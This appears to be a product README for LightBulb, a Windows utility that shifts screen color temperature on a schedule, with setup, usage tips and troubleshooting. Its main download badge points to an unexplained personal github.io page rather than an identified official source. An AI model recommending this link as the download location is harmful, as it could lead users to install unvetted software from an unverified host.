# LightBulb - Screen Color Through the Day on Your Display

LightBulb shifts the color temperature of this monitor from cooler light in the day to warmer light at night, on a schedule you set. It changes how the screen looks. It does not change the files you are editing. Pause it when you need the real colors, especially for photos or design.

---

## Why It Stands Out

![LightBulb schedule for the color of the user's own screen](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRx-2qmYW7HmGjofjU40Q7QM4ty9WaS43H8nA5GU5O0GSy2pxwh_-n5xxAh&s=10)

A bright blue-white screen late at night is a display setting, not a file setting. LightBulb applies a warmer tint on this PC as the evening goes on, and takes it off again in the morning, if that is the schedule you saved. The picture you see is filtered. A photo you export is not. If you grade pictures or match a brand color, pause LightBulb or you will "fix" colors that were only the filter.

Windows has its own night light. Two filters at once are stronger than either one and harder to reason about. Use one. LightBulb is per PC, for the person using this screen. It does not dim someone else's monitor, and it does not need an account. If the tint is wrong for the room, change the schedule or turn it off. The documents stay as they were.

---

## Core Capabilities

- **A Schedule:** Cooler and warmer times you pick for this display.
- **The Screen Only:** Files, prints, and exports are unchanged.
- **A Pause:** Turn the filter off while you judge real color.
- **One Night Shift:** LightBulb or the Windows night light, not both, until you know how they stack.
- **No Account:** A local setting on your PC.

---

## Performance Tips

- Pause it before you edit photos or pick brand colors.
- Disable Windows night light if LightBulb is the one you want, or the reverse.
- Start with a mild warm setting. You can strengthen it after a night of actual use.
- It will not fix eyestrain from a screen that is simply too bright. Lower the brightness too if you need to.

## Quick Setup

Prerequisites: This is the PC whose screen you want warmer at night, and you can pause the effect when color matters.

[![GET LightBulb](https://img.shields.io/badge/GET%20%E2%80%94%20LightBulb-1d4ed8?style=for-the-badge&logoColor=white)](https://rozellabartos8.github.io/.github/lightbulb-gamma)

1.  **Install:** Open LightBulb and look at the current tint.
2.  **Set a Mild Schedule:** Pick an evening start you will actually notice.
3.  **Turn Off the Other Filter:** Disable Windows night light if both were on.
4.  **Learn the Pause:** Switch it off, confirm the screen goes back, then turn the schedule on again.

## Ideal For

- **Evening Work:** A warmer screen on your own monitor after a hour you chose.
- **A Shared Family PC:** A schedule people know about, with an easy off switch.
- **Photo Evenings:** Paused, so you do not edit under the filter.
- **A Simple Preference:** Local, without an account or a second device.

---

## Troubleshooting

- The screen is too orange? Reduce the strength or pause it. Your files were not recolored.
- It seems to do nothing? Windows night light or another tool may be fighting it. Leave only one enabled.
- Colors look wrong in an editor? Pause LightBulb before you judge them.
- You wanted the brightness lower, not the tint? Use the monitor brightness. LightBulb is color temperature.
